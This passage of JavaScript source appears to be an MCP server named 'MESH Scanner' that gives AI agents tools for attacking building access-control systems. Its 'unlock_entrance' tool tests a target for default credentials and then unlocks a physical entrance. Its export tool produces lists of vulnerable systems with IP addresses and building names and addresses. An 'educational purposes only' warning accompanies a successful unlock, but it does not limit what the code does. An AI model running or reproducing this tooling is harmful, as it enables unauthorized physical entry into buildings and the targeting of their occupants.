        case "unlock_entrance": {
            const url = String(request.params.arguments?.url);
            const entranceId = String(request.params.arguments?.entranceId);
            if (!url || !entranceId) {
                throw new McpError(ErrorCode.InvalidParams, "URL and entrance ID are required");
            }
            // Check if system is vulnerable first
            const { vulnerable } = await testDefaultCredentials(url);
            if (!vulnerable) {
                return {
                    content: [{
                            type: "text",
                            text: JSON.stringify({ error: "System is not vulnerable to default credentials" }, null, 2)
                        }]
                };
            }
            const success = await unlockEntrance(url, entranceId);
            return {
                content: [{
                        type: "text",
                        text: JSON.stringify({
                            success,
                            message: success ? "Entrance unlocked successfully" : "Failed to unlock entrance",
                            warning: "This action was performed for educational purposes only. In real scenarios, this would be unauthorized access."
                        }, null, 2)
                    }]
            };
        }
        case "export_scan_results": {
            const format = String(request.params.arguments?.format);
            const includeVulnerableOnly = Boolean(request.params.arguments?.includeVulnerableOnly);
            const scanId = request.params.arguments?.scanId;
            let resultsToExport = scanResults;
            if (scanId) {
                resultsToExport = scanResults.filter(s => s.scanId === scanId);
            }
            if (includeVulnerableOnly) {
                resultsToExport = resultsToExport.filter(s => s.vulnerable);
            }
            let exportData = '';
            switch (format) {
                case 'csv':
                    exportData = 'IP Address,URL,Vulnerable,Building Name,Building Address,Timestamp,Scan ID\n';
                    exportData += resultsToExport.map(s => `${s.ipAddress},${s.url},${s.vulnerable},${s.buildingName || ''},${s.buildingAddress || ''},${s.timestamp},${s.scanId}`).join('\n');
                    break;
                case 'xml':
                    exportData = '<?xml version="1.0" encoding="UTF-8"?>\n<scan_results>\n';
                    exportData += resultsToExport.map(s => `  <system>
    <ip_address>${s.ipAddress}</ip_address>
    <url>${s.url}</url>
    <vulnerable>${s.vulnerable}</vulnerable>
    <building_name>${s.buildingName || ''}</building_name>
    <building_address>${s.buildingAddress || ''}</building_address>
    <timestamp>${s.timestamp}</timestamp>
    <scan_id>${s.scanId}</scan_id>
  </system>`).join('\n');
                    exportData += '\n</scan_results>';
                    break;
                default: // json
                    exportData = JSON.stringify(resultsToExport, null, 2);
            }
            return {
                content: [{
                        type: "text",
                        text: exportData
                    }]
            };
        }
        default:
            throw new McpError(ErrorCode.MethodNotFound, `Unknown tool: ${request.params.name}`);
    }
});
/**
 * Start the server
 */
async function main() {
    const port = process.env.PORT ? parseInt(process.env.PORT) : 3000;
    // Create HTTP server with proper configuration
    const transport = new StreamableHTTPServerTransport({
        sessionIdGenerator: () => `session_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`
    });
    await server.connect(transport);
    // Start HTTP server
    const http = require('http');
    const serverInstance = http.createServer(async (req, res) => {
        if (req.url === '/mcp' || req.url?.startsWith('/mcp?')) {
            await transport.handleRequest(req, res);
        }
        else {
            res.writeHead(404);
            res.end('Not Found');
        }
    });
    serverInstance.listen(port, '0.0.0.0', () => {
        console.error("MESH Scanner MCP server running on HTTP transport");
        console.error("Version: 0.2.0 - Enhanced with prompts, resources, and improved tools");
        console.error(`Server listening on http://0.0.0.0:${port}`);
        console.error(`MCP endpoint available at: http://0.0.0.0:${port}/mcp`);
    });
    // Error handling
    server.onerror = (error) => console.error("[MCP Error]", error);
}
main().catch((error) => {
    console.error("Server error:", error);
    process.exit(1);
});
